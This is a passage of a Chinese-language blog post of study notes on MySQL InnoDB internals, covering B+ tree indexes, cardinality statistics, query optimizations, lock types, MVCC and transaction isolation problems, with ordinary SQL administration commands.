InnoDB行记录格式</h3><p>页中保存着一行行的数据。</p><p>行格式两种：1. Compact     2.  Redundant</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;查看当前表使用的行格式</span><br><span class="line">show table like status like &#39;table_name&#39;\G;</span><br></pre></td></tr></table></figure><p><strong>row_format</strong>记录了当前所使用的行记录结构类型。</p><h2 id="5-索引与算法"><a href="#5-索引与算法" class="headerlink" title="5.索引与算法"></a>5.索引与算法</h2><h3 id="5-1-Innodb存储引擎的索引概述"><a href="#5-1-Innodb存储引擎的索引概述" class="headerlink" title="5.1 Innodb存储引擎的索引概述"></a>5.1 Innodb存储引擎的索引概述</h3><p>Innodb支持以下几种常见的索引：</p><ol><li><p>B+树索引</p><p>传统意义上的索引。B+树构造类似于二叉树，根据键值快速找到数据。B代表的是balance。B+树索引并不能找到一个给定键值的具体行。<strong>B+树索引能找到被查数据所在的页。</strong>然后数据库将页读入内存，再在内存中进行查找，最后得到要查找的数据。</p></li><li><p>全文索引</p></li><li><p>哈希索引</p><p>自适应的，Innodb存储引擎会根据表的使用情况自动为表生成哈希索引，不能认为干预是否在一张表中生成哈希索引。</p></li></ol><h3 id="5-2-索引相关数据结构"><a href="#5-2-索引相关数据结构" class="headerlink" title="5.2  索引相关数据结构"></a>5.2  索引相关数据结构</h3><p><strong>平衡二叉树即ALV</strong>，首先满足二叉查找树的定义，其次必须满足任何结点的两个子树的高度最大差为1。</p><p>通过多次左旋或者右旋维持二叉树的平衡性。</p><h3 id="5-3-B-树"><a href="#5-3-B-树" class="headerlink" title="5.3 B+树"></a>5.3 B+树</h3><p>B+树是为磁盘或其他直接存取辅助设备设计的以中国平衡查找树。B+树中，所有记录结点都是按键值的大小顺序放在同一层的叶子节点上，由各叶子结点指针进行连接。</p><h4 id="5-3-1-B-树的插入操作"><a href="#5-3-1-B-树的插入操作" class="headerlink" title="5.3.1 B+树的插入操作"></a>5.3.1 B+树的插入操作</h4><p>B+树插入需要保证插入后叶子结点中的记录依然排序，需要考虑三种情况。</p><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211118201105.png"></p><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211118202103.png"></p><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211118202006.png"></p><p>直接插入</p><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211118202020.png"></p><p>拆分叶子节点</p><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211118202031.png"></p><p>索引页和叶子页都拆分</p><p>为了保持平衡对于新插入的键值可能需要做大量的拆分页操作。<strong>B+树结构主要用户磁盘，页的拆分意为着磁盘的操作，所以应经可能减少页的拆分操作。</strong></p><p><strong>B+树同样提供了类似于平衡二叉树的旋转操作功能。</strong></p><p>旋转发生在Leaf Page已经满，但是其的左右兄弟结点没有满的情况下。B+树不会急于去做拆分页的操作，而是将记录移到所在页的兄弟节点上。</p><h4 id="5-3-2-B-树的删除操作"><a href="#5-3-2-B-树的删除操作" class="headerlink" title="5.3.2 B+树的删除操作"></a>5.3.2 B+树的删除操作</h4><p>B+树使用填充因子来控制树的删除变化。50%是填充因子可设的最小值。B+树的删除操作同样必须保证删除后叶子结点中的记录依然排序。删除根据填充因子的变化来衡量。</p><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211118204350.png"></p><h3 id="5-4-B-树索引"><a href="#5-4-B-树索引" class="headerlink" title="5.4 B+树索引"></a>5.4 B+树索引</h3><p>B+树索引的本质就是B+树在数据库中的实现。但是B+索引在数据库中有一个特定是高扇出性。B+树的高度一般在2~4层，也就是说查找某一键值的行记录时最多需要2到4此IO。</p><p>B+树的索引可以分为<strong>聚集索引</strong>和<strong>辅助索引</strong>。<strong>聚集索引与辅助索引不同的是叶子结点存放的是否是一整行的数据</strong></p><h4 id="5-4-1-聚集索引"><a href="#5-4-1-聚集索引" class="headerlink" title="5.4.1 聚集索引"></a>5.4.1 聚集索引</h4><p>Innodb存储引擎表是索引组织表，即表中数据是按照主键顺序存放。</p><p><strong>聚集索引就是按照每张表的主键构造一颗B+树，叶子结点中存放的即为整张表的行记录数据，也将聚集索引的叶子结点称为数据页。</strong></p><p>聚集索引的这个特性决定了索引组织表<strong>中数据也是索引的一部分。同B+树数据结构一样，每个数据页都通过一个双向链表进行链接。</strong></p><p>实际的数据页只能按照一棵B+树进行排序，因此每张表中只能拥有一个聚集索引。</p><p>查询优化器倾向于采用聚集索引，因为聚集索引能够在B+树索引的叶子结点上直接找到数据。</p><p>数据页上存放的是完整的每行的记录，非数据页的索引页中，存放的仅仅是键值及指向数据页的偏移量，而不是一个完整的行记录。</p><p><strong>聚集索引的存储并不是物理上连续的，而是逻辑上连续的。</strong></p><ol><li>页通过双向链表链接，页按照主键的顺序排序。</li><li>每个页中的记录也是通过双向链表进行维护的，物理存储上可以同样不按照主键存储。</li></ol><p>好处：</p><ol><li>对主键的排序查找和范围查找速度非常快</li><li><strong>范围查询</strong>，如果想要查找主键某一范围内的数据，通过叶子节点的上层结点就可以得到页的范围，之后直接读取数据页即可。</li></ol><p>explain（execute plan)  Mysql数据库的执行计划。</p><h4 id="5-4-2-辅助索引"><a href="#5-4-2-辅助索引" class="headerlink" title="5.4.2 辅助索引"></a>5.4.2 辅助索引</h4><p><strong>叶子结点并不包含行记录的全部数据。叶子结点除了包含键值以外，每个叶子结点中的索引行还包含了一个书签。****书签用来告诉Innodb存储引擎哪里可以找到与索引相对应的行数据</strong>。由于Innodb存储引擎是索引组织表，因此Innodb存储引擎的辅助索引的书签就是响应行数据的聚集索引键。</p><p>辅助索引的存在并不影响数据在聚集索引中的组织，因此每张表上可以有多个辅助索引。</p><p>通过辅助索引寻找数据时</p><ol><li>Innodb存储引擎遍历辅助索引并通过叶级别的指针获得指向主键索引的主键</li><li>通过主键索引来找到一个完整的行记录。</li></ol><p>SQL SERVER中的<strong>堆表</strong>：行数据的存储按照插入的顺序存放。堆表的特性决定了堆表上的索引都是非聚集的，主键与非主键的区别只是是否唯一且非空。这时书签是一个<strong>行标识符</strong>。</p><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211119144334.png"></p><h4 id="5-4-3-B-树索引的分裂"><a href="#5-4-3-B-树索引的分裂" class="headerlink" title="5.4.3 B+树索引的分裂"></a>5.4.3 B+树索引的分裂</h4><p>与B+树的分裂略有不同</p><p>B+树索引页的分裂并不总是从页的中间记录开始的，这样会导致空间的浪费。</p><p>Innodb存储引擎的Page Header中有以下几个部分用来保存插入的顺序信息：</p><ol><li><strong>PAGE_LAST_INSERT</strong></li><li><strong>PAGE_DIRECTION</strong></li><li><strong>PAGE_N_DIRECTION</strong></li></ol><p>通过这些信息，Innodb引擎决定是向左还是向右进行分裂，同时决定分裂点记录为哪一个。</p><p>INNODB存储引擎插入时，首先需要进行定位，定位到的记录为待插入记录额前一条记录。</p><h4 id="5-4-4-B-树索引的管理"><a href="#5-4-4-B-树索引的管理" class="headerlink" title="5.4.4 B+树索引的管理"></a>5.4.4 B+树索引的管理</h4><p><strong>1.索引管理</strong></p><p>Alter table</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;创建索引</span><br><span class="line">Alter Table tbl_name</span><br><span class="line">add index|key index_name</span><br><span class="line">index_type   index_col_name</span><br><span class="line">&#x2F;&#x2F;删除索引</span><br><span class="line">alter table tbl_name</span><br><span class="line">drop primary key | drop index|key   index_name</span><br></pre></td></tr></table></figure><p>create/drop index</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;创建索引</span><br><span class="line">create &#123;unique&#125; index index_name &#123;index_type&#125;</span><br><span class="line">on tbl_name &#123;index_col_name,..&#125;</span><br><span class="line">&#x2F;&#x2F;删除索引</span><br><span class="line">drop index index_name on tbl_name</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;查看某个表上的索引情况</span><br><span class="line">show index from tbl_name</span><br></pre></td></tr></table></figure><table><thead><tr><th>字段名</th><th>字段含义</th></tr></thead><tbody><tr><td>table</td><td>索引所在的表名</td></tr><tr><td>Non_unique</td><td>非唯一的索引，可以看到primary key为0是唯一的</td></tr><tr><td>Key_name</td><td>索引的名字，通过该值来drop index</td></tr><tr><td>seq_in_index</td><td>索引中列的位置，联合索引中指示1，2…</td></tr><tr><td>column_name</td><td>索引列名称</td></tr><tr><td>collation</td><td>列的存储方式A或者NULL。B+树索引总是A，即排序的。若是Heap存储引擎，并且建立了哈希索引，就为NULL</td></tr><tr><td>cardinality</td><td>表示索引中唯一值的数目的估计值。应尽可能接近1，若非常小，用户需要考虑是否可以删除此索引。</td></tr><tr><td>sub_part</td><td>列的部分被索引。若索引整个列，字段为NULL</td></tr><tr><td>packed</td><td>关键字如何被压缩。若未压缩，则为NULL</td></tr><tr><td>NULL</td><td>是否索引的列含有Null值。</td></tr><tr><td>Index_type</td><td>索引的类型。</td></tr><tr><td>Comment</td><td>注释</td></tr></tbody></table><p>Cardinality值很关键，优化器根据这个值来判断是否使用这个索引。该值并不是实时更新的，即每次索引的更新都会更新该值，代价太大了。</p><p><strong>若要更新cardinality的信息，可以使用analyze table命令。</strong></p><p>Cardinality为NULL，某些情况下会发生索引建立了却没有用到的情况。或者两次explain会出现一次是使用了索引，一次使用的是全表扫描。这时就应该做一次analyze table操作。</p><p><strong>2.Fast Index Creation</strong>(快速索引创建)  </p><p>以前</p><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211120160656.png"></p><p>弊端：对大表索引的添加和删除操作，需要很长的时间。</p><p>对于辅助索引的创建，Innodb存储引擎会对创建索引的表加上一个s锁。创建过程中不需要重建表。</p><p>删除辅助索引操作更简单，Innodb存储只需要更新内部视图，并将辅助索引的空间标记为可用，同时删除Mysql数据库内部视图上多该表的索引。</p><p><strong>3.Online Schema Change</strong> (在线架构改变)</p><p><strong>4.Online DDL</strong>（在线数据定义）</p><p>允许辅助索引创建的同时，还允许各类DML操作，提高了Mysql数据库的可用性。</p><p>以下几类DDL操作都可以通过在线方式操作</p><ol><li>辅助索引的创建</li><li>改变自增长值</li><li>添加或者删除外键约束</li><li>列的重命名</li></ol><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211120162251.png"></p><p>lock部分为索引创建或删除时对表添加锁的情况：</p><p>1）None</p><p>执行索引创建或者删除时，对目标不添加任何的锁。即事务仍然可以进行读写操作，不会受到阻塞。这种模式可以获得做大的并发度。</p><p>2）SHARE</p><p>和FIC类似，执行索引拆功能键或删除操作时，对目标表加上一个s锁。对于并发的读事务，依然可以执行，但是遇到写事务，就会发生等待。</p><p>3）EXCLUSIVE</p><p>执行时，对目标加上一个x锁。读写事务都不能进行，会阻塞所有的线程，这和copy方式运行得到的状态类似，但是不需要像copy那样创建一张临时表。</p><p>4）DEFAULT</p><p>该模式会判断当前操作是否可以使用none模式，若不能，则判断是否可以使用share模式，最后判断是否可以使用exclusive模式。<strong>也就是通过判断事务的最大并发性来判断执行DDL的新模式。</strong></p><h3 id="5-5-Cardinality值"><a href="#5-5-Cardinality值" class="headerlink" title="5.5 Cardinality值"></a>5.5 Cardinality值</h3><h4 id="5-5-1-什么是cardinality"><a href="#5-5-1-什么是cardinality" class="headerlink" title="5.5.1 什么是cardinality"></a>5.5.1 什么是cardinality</h4><p>并不是所有的查询条件中出现的列都需要添加索引。<strong>对表字段高选择性的适合使用B+树索引。</strong>也就是基本不重复的。<strong>sql语句选取表中较少行的原则。</strong></p><p><strong>通过show index中的cardinality的值来查看。表示的是索引中不重复记录数量的预估值。</strong></p><p>cardinality值尽可能地接近1，在访问高选择性的字段并从表中取出很少一部分数据时，对这个字段添加B+树索引是有必要的。</p><h4 id="5-5-2-Innodb存储引擎中的cardinality统计"><a href="#5-5-2-Innodb存储引擎中的cardinality统计" class="headerlink" title="5.5.2 Innodb存储引擎中的cardinality统计"></a>5.5.2 Innodb存储引擎中的cardinality统计</h4><p>cardinality表示选择性。<strong>建立索引的前提是列中的数据是高选择性的。</strong></p><p><strong>不同的存储引擎对于B+树索引实现是不同的，所以对cardinality的统计是放在存储引擎层进行的。</strong></p><p>数据库对于cardinality的统计是通过<strong>采样</strong>的方法来完成的。原因是索引更新频繁如果每次都统计会给数据库带来负担，而且对于大表统计时间很长。</p><p>Cardinality统计信息发生在</p><ol><li>INSERT</li><li>UPDATE</li></ol><p>InnoDB存储引擎内部对更新cardinality信息的策略为</p><ol><li><p>表中1/16的数据已经发生过变化</p></li><li><p>stat_modified_counter&gt;2 000 000 000</p><p>对第一种的弥补，防止某一行数据频繁的进行更新操作，表中的数据司机并没有增加。<strong>在INNODB存储引擎中有一个计数器sata_modified_counter，用来表示发生变化的次数。</strong></p></li></ol><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211120185003.png"></p><p>当然，当表足够小时，表的叶子结点树小于或者等于8个，这是随机采样，总会采取到这些页，因此cardinality值是相同的。</p><p>当执行</p><ol><li><strong>analyze table</strong></li><li><strong>show tables status</strong></li><li><strong>show index</strong></li><li><strong>访问information_schema架构下的表tables和statistics</strong></li></ol><p><strong>会导致Innodb存储引擎去重新计算索引的cardinality值。</strong></p><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211120185800.png"></p><h3 id="5-6-B-树索引的使用"><a href="#5-6-B-树索引的使用" class="headerlink" title="5.6 B+树索引的使用"></a>5.6 B+树索引的使用</h3><p><strong>OLTP</strong>:on-line transaction processing）翻译为联机事务处理  主要是数据库增删改</p><p><strong>OLAP</strong>:On-Line Analytical Processing）翻译为联机分析处理   主要是查询数据</p><p><strong>OLTP应用中</strong>查询操作只取得一小部分数据，一般就是根据主键来取的用户信息，典型的OLTP应用。<strong>这时，B+树索引建立后，对索引的使用应该只是通过该索引取得表中少部分的数据。这时候建立B+树索引是有意义的。</strong>否则即使建立了，优化器也可能选择不适用索引。</p><p><strong>OLAP</strong>中情况会复杂。OLAP中需要访问表中大量数据，查询是面向分析的查询。</p><p>OLAP中不需要给用户姓名加索引，<strong>一般都会对时间字段加索引。</strong>大多数统计需要根据时间维度来进行数据的筛选。</p><h4 id="5-6-2-联合索引"><a href="#5-6-2-联合索引" class="headerlink" title="5.6.2 联合索引"></a>5.6.2 联合索引</h4><p>对表上的多个列进行索引。</p><p>从本质上来说，联合索引也是一颗B+树，不同的联合索引的键值的数量不是1，而是大于等于2。</p><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211120193223.png"></p><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211120193250.png"></p><p>联合索引的第二个好处是已经对第二个键值进行了排序处理。使用联合索引可以避免多一次的排序操作，因为索引本身在叶子结点已经排好序了。</p><h4 id="5-6-3-覆盖索引"><a href="#5-6-3-覆盖索引" class="headerlink" title="5.6.3 覆盖索引"></a>5.6.3 覆盖索引</h4><p><strong>Innodb存储引擎支持覆盖索引，也称为索引覆盖，即从辅助索引中就可以得到查询的记录，而不需要查询聚集索引中的记录。</strong></p><p>好处：</p><p><strong>辅助索引不包含整行的所有信息，故其大小要远远小于聚集索引，因此可以减少大量的IO操作。</strong></p><p>因为Innodb存储引擎的辅助索引存放了主键值，所以常常建立联合索引，就可以在辅助索引里即拿到主键的值。</p><p>覆盖索引的另一个好处是对<strong>某些统计问题</strong>而言。<strong>因为表上有辅助索引，优化器不会选择聚集索引，因为辅助索引远小于聚集索引，选择辅助索引可以减少IO操作。</strong></p><p>如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from tbl_name</span><br></pre></td></tr></table></figure><h4 id="5-6-4-优化器选择不使用索引的情况"><a href="#5-6-4-优化器选择不使用索引的情况" class="headerlink" title="5.6.4 优化器选择不使用索引的情况"></a>5.6.4 优化器选择不使用索引的情况</h4><p>用explain命令来进行sql语句的分析时，<strong>会发现优化器并没有选择索引去查找数据</strong>，而是通过扫描聚集索引，也就是直接进行全表的扫描来得到数据。</p><p><strong>该情况多发生于范围查找、JOIN链接操作等情况。</strong></p><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211121143047.png"></p><p>可以使用 FORCE INDEX来强制使用某个索引</p><h4 id="5-6-5-索引提示"><a href="#5-6-5-索引提示" class="headerlink" title="5.6.5 索引提示"></a>5.6.5 索引提示</h4><p>mysql数据库支持索引提示(INDEX HINT)显式地告诉优化器使用哪个索引。</p><h4 id="5-6-6-Multi-Range-Read-优化"><a href="#5-6-6-Multi-Range-Read-优化" class="headerlink" title="5.6.6 Multi-Range Read 优化"></a>5.6.6 Multi-Range Read 优化</h4><p>mysql5.6版本开始支持MMR优化。<strong>MRR优化目的是为了减少磁盘地随机访问，并且将随机访问转化为较为顺序地数据访问</strong>。<strong>适用于range，ref，eq_ref类型的查询</strong></p><p>好处：</p><ol><li>MMR使得数据访问变得顺序。查找辅助索引时，根据查询结果，按照主键进行排序，并按照主键排序的顺序进行书签查找。</li><li>减少缓冲池中页被替换的次数</li><li>批量处理对键值的查询操作。</li></ol><p>对于Innodb和MyISAM存储引擎的范围查询和JOIN查询操作。MMR工作方式如下：</p><ol><li>将查询得到的辅助索引键值存放到一个缓存中，缓存中的数据时根据辅助索引键值排序的。</li><li>将缓存中的键值根据ROWID来进行排序</li><li>根据ROWID的排序顺序来访问实际的数据文件</li></ol><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211121145123.png"></p><h4 id="5-6-7-Index-Condition-Pushdown-ICP-优化"><a href="#5-6-7-Index-Condition-Pushdown-ICP-优化" class="headerlink" title="5.6.7 Index Condition Pushdown(ICP 优化)"></a>5.6.7 Index Condition Pushdown(ICP 优化)</h4><p>Mysql5.6后支持的根据索引进行查询的优化方式。</p><p><strong>在支持Index Condition Pushdown后，mysql 数据库会在取出索引的同时，判断是否可以进行where条件的过滤。也就是将where的部分过滤放在了存储引擎层。</strong></p><p><strong>ICP</strong>优化支持range,ref,eq_ref,ref_or_null类型的查询，当前支持MyISAM和Innodb存储引擎。</p><h3 id="5-7-哈希算法"><a href="#5-7-哈希算法" class="headerlink" title="5.7 哈希算法"></a>5.7 哈希算法</h3><h4 id="5-7-2-Innodb存储引擎中的哈希算法"><a href="#5-7-2-Innodb存储引擎中的哈希算法" class="headerlink" title="5.7.2 Innodb存储引擎中的哈希算法"></a>5.7.2 Innodb存储引擎中的哈希算法</h4><p><strong>Innodb存储引擎使用哈希算法来对字典进行查找，冲突采用链表方式，哈希函数采用除法散列方式。</strong></p><h4 id="5-7-3-自适应哈希索引"><a href="#5-7-3-自适应哈希索引" class="headerlink" title="5.7.3  自适应哈希索引"></a>5.7.3  自适应哈希索引</h4><p>InnoDB存储引擎会监控对表上各索引页的查询，如果监控到某个索引页被频繁查询，并诊断后发现如果为这一页的数据创建Hash索引会带来更大的性能提升，则会自动为这一页的数据创建Hash索引，并称之为<strong>自适应Hash索引。</strong></p><p>由Innodb存储引擎自己控制的，通常是对热点索引页创建哈希索引。<strong>自适应Hash索引看成是索引的索引</strong></p><p><strong>通过参数innodb_adaptive_hash_index来禁用或启动此特性。默认为开启。</strong></p><h3 id="5-8-全文检索"><a href="#5-8-全文检索" class="headerlink" title="5.8 全文检索"></a>5.8 全文检索</h3><p><strong>全文检索是将存储与数据库的整本书或整篇文章中的任意内容信息查找出来的技术。</strong>根据需要获得全文中有关章、节、段、句、词等信息，进行各种统计和分析。</p><p>5.8.2   倒排索引</p><h2 id="6-锁"><a href="#6-锁" class="headerlink" title="6.锁"></a>6.锁</h2><h3 id="6-1-锁"><a href="#6-1-锁" class="headerlink" title="6.1 锁"></a>6.1 锁</h3><p>锁是数据库系统区别于文件系统的一个关键特性。锁机制解决对共享资源的并发访问问题。</p><p>InnoDB存储引擎在行级别上对表数据上锁。</p><p>MyIsam引擎支持的是表锁设计。并发情况下的读没有问题，但是在并发插入的性能上会差一点，若插入在底部，MyISAM存储引擎有一定的并发写入操作。</p><p>InnoDB存储引擎提供一致性的非锁定读、行级锁支持。</p><h3 id="6-2-lock与latch"><a href="#6-2-lock与latch" class="headerlink" title="6.2 lock与latch"></a>6.2 lock与latch</h3><p><strong>latch</strong>是轻量级的锁。其要求锁定的时间短。在InnoDB中又分为mutex（互斥量)和rwlock（读写锁)。其目的是用来保证并发线程操作临界资源的正确性。没有思索检测机制。</p><p><strong>lock</strong>的对象是事务，锁定的是数据库中的对象。如表、页、行。在事务commit或rollback后进行释放。具有死锁机制。</p><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211117205056.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;查看Innodb中的Latch,通过</span><br><span class="line">show engine innodb mutex</span><br><span class="line">&#x2F;&#x2F;在debug版本下 该命令可以查看更多信息</span><br></pre></td></tr></table></figure><h3 id="6-3-InnoDB存储引擎中的锁"><a href="#6-3-InnoDB存储引擎中的锁" class="headerlink" title="6.3 InnoDB存储引擎中的锁"></a>6.3 InnoDB存储引擎中的锁</h3><p>Innodb存储引擎实现如下两种标准的行级锁：</p><ol><li>共享锁(s)，允许事务读一行数据</li><li>排他锁(x)，允许事务删除或更新一行数据</li></ol><p>InnoDB存储引擎支持不同粒度上进行加锁操作。额外的加锁方式-&gt;<strong>意向锁</strong>（IS,IX)：将锁定的对象分为多个层次，意向锁意味着事务希望在更细粒度上进行加锁。</p><p>意向共享锁(IS LOCK):事务想要获得一张表中某几行的共享锁。</p><p>意向排他锁(IX LOCK)：事务想要获得一张表中某几行的排他锁。</p><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211117210431.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;查看当前锁请求的信息</span><br><span class="line">show engine innodb status</span><br></pre></td></tr></table></figure><p>在Information_schema架构下三种表innodb_trx,innodb_locks,innodb_lock_waits</p><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211117211330.png"></p><p>该表只能显示当前运行的InnoDB事务，并不能直接判断锁的一些情况。若需要查看锁，还需要访问InnoDB_locks。</p><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211117211543.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;查看表信息</span><br><span class="line">select * from information_schema.innodb_locks\G;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211118131709.png"></p><p>Innodb_lock_waits表直观的反应了当前事务的等待。</p><h4 id="6-3-2-一致性非锁定读"><a href="#6-3-2-一致性非锁定读" class="headerlink" title="6.3.2 一致性非锁定读"></a>6.3.2 一致性非锁定读</h4><p>指InnoDB存储引擎通过行多版本控制的方式来读取当前执行时间数据库中的数据。如果读取的行正在执行delete或Update操作，这时读取操作不会因此去等待行上锁的释放。相反，InnoDB会去读取行的一个快照数据。</p><p><strong>非锁定读</strong>：因为不需要等待访问的行上x锁的释放。</p><p><strong>快照数据</strong>：指的是该行之前版本的数据，通过Undo段完成。undo用来在事务回滚数据。读取快照数据是不需要上锁的。</p><p>该机制提高了数据库的并发性。<strong>Innodb默认的读取方式</strong>，不会占用和等待表上的锁。</p><p><strong>MVCC</strong>多版本并发控制，快照数据是当前数据之前的历史版本，每行记录可能有多个版本。一行记录可能有不止一个快照数据。</p><p>在read committed和repeatable read事务隔离级别下，Innodb存储引擎使用非锁定的一致性读。</p><p>read commiteted：对于快照数据，非一致性读总是读取被锁定行的最新一份快照数据。</p><p>repeatable read：对于快照数据，非一致性读总是读取事务开始时的行数据版本。</p><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211118141409.png"></p><h4 id="6-3-3-一致性锁定读"><a href="#6-3-3-一致性锁定读" class="headerlink" title="6.3.3 一致性锁定读"></a>6.3.3 一致性锁定读</h4><p>Innodb引擎默认事务隔离级别为repeatable read模式,innodb存储引擎的select操作使用一致性非锁定读。</p><p>某些情况，用户需要显式地对数据库读取操作进行加锁以保证数据逻辑地一致性。</p><p>innodb对于select语句支持两种一致性地锁定读：</p><ol><li>select … for   update 对读取地记录加一个x锁，其他事务不能对已锁定地行加上任何锁。</li><li>select …  lock in  share mode 对读取地行记录加一个s锁，其他事务可以向被锁定地行加s锁，若加x锁，则会被阻塞。</li></ol><p>使用这两种锁定语句时，务必加上begin  ,  start  transaction  , set autocommit=0</p><p>6.3.4 自增长与锁</p><p>Innodb存储引擎地内存结构中，每个含有自增长值得表都有一个自增长计数器(auto-increment counter)。当对含有自增长得计数器得表进行插入操作时，这个计数器会被初始化。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;得到计数器得值</span><br><span class="line">select max(auto_inc_col) from t for update</span><br></pre></td></tr></table></figure><p>插入操作会依据这个自增长得计数器值加1赋予自增长列。该方式称作<strong>auto-inc locking</strong>。<strong>该锁是一种特殊得表锁机制</strong>，为了提高插入得性能，锁不是在一个事务完成后释放得，而是在完成对自增长值插入得sql语句后立即释放得。</p><p>但是该锁会影响到大数据量的插入性能，因为另一个事务中的插入会阻塞。</p><p>从5.1.22版本开始  Innodb提供了一种轻量级互斥量的自增长实现机制。Innodb提供了一个参数Innodb_autoinc_lock_mode来控制增长的模式，默认值为1。自增长插入类型的分类：</p><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211118144231.png"></p><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211118144316.png"></p><h4 id="6-3-5-外键和锁"><a href="#6-3-5-外键和锁" class="headerlink" title="6.3.5  外键和锁"></a>6.3.5  外键和锁</h4><p>外键主要引用完整性的约束检查。Innodb存储引擎中，对于一个外键列，如果没有显式地对这个列加索引，InnoDB存储引擎会自动对其加一个索引，因为这样可以避免表锁。</p><p>对于外键值得插入或更新，首先需要查询附表中得记录，即SELECT表。对于父表得SELECT操作，不是使用一致性非锁定读得方式，因为这样会发生数据不一致得问题，因此这时使用得时select … lock  in  share  mode方式，即主动对父表加一个S锁。</p><h3 id="6-4-锁算法"><a href="#6-4-锁算法" class="headerlink" title="6.4 锁算法"></a>6.4 锁算法</h3><p>行锁的三种算法：</p><p>1.Record Lock:单个记录上的锁</p><p>2.Gap Lock:间隙锁，锁定一个范围，但不包含记录本身。</p><p>3.Next-Key Lock:  Record Lock+ Gap Lock  锁定一个范围，并且锁定记录本身。</p><h3 id="6-5-锁问题"><a href="#6-5-锁问题" class="headerlink" title="6.5 锁问题"></a>6.5 锁问题</h3><h4 id="6-5-1-脏读"><a href="#6-5-1-脏读" class="headerlink" title="6.5.1 脏读"></a>6.5.1 脏读</h4><p><strong>脏页</strong>值的是在缓冲池中已经被修改的页，但是还没有刷新到磁盘中，即数据库实例内存中的页和磁盘中的页的数据是不一致的。当然在刷新到磁盘之前，日志都已经写入到了重做日志文件中。</p><p><strong>脏数据</strong>是指事务对缓冲池中行记录的修改，并且还没有被提交。</p><p>脏页的读取是正常的。脏页是因为数据库实例内存和磁盘的异步造成的，并不影响数据的一致性。脏页的刷新是异步的，提高性能。</p><p>脏数据却不一样，一个事务可以读到另一个事务未提交的数据，显然违背的数据库的隔离性。</p><p><strong>脏读</strong>指的就是在不同的事务下，当前事务可以读取到另外事务未提交的数据。即可以读取到脏数据。</p><h4 id="6-5-2-不可重复读"><a href="#6-5-2-不可重复读" class="headerlink" title="6.5.2 不可重复读"></a>6.5.2 不可重复读</h4><p><strong>不可重复度</strong>是指在一个事务内多次读取到统一数据集合。两次读取到的数据是不一样的。</p><p><strong>与脏读的区别是：</strong>脏读读取到的是未提交的数据，而不可重复读读取的是已经提交的数据，但是违反了数据库事务一致性的要求。</p><p>Mysql官方文档将不可重复的问题定义为Phantom Problem  即幻像问题。</p><p>innodB存储引擎默认事务隔离级别是READ REPEATABLE  采用Next-Key Lock算法，避免了不可重复读的现象。</p><h4 id="6-5-3-丢失更新"><a href="#6-5-3-丢失更新" class="headerlink" title="6.5.3  丢失更新"></a>6.5.3  丢失更新</h4><p><strong>丢失更新</strong>就是一个事务的更新操作会被另一个事务的更新操作所覆盖，导致数据的不一致。</p><p>但是在当前数据库中，无论是任何隔离级别下，都不会导致数据库理论意义上的丢失更新。因为需要对行或其他粗粒度级别的对象加锁。</p><p>要避免丢失更新发生，需要让事务在这种情况下的操作变成串行化，而不是并行的操作。</p><p>实际应用中使用select … for update  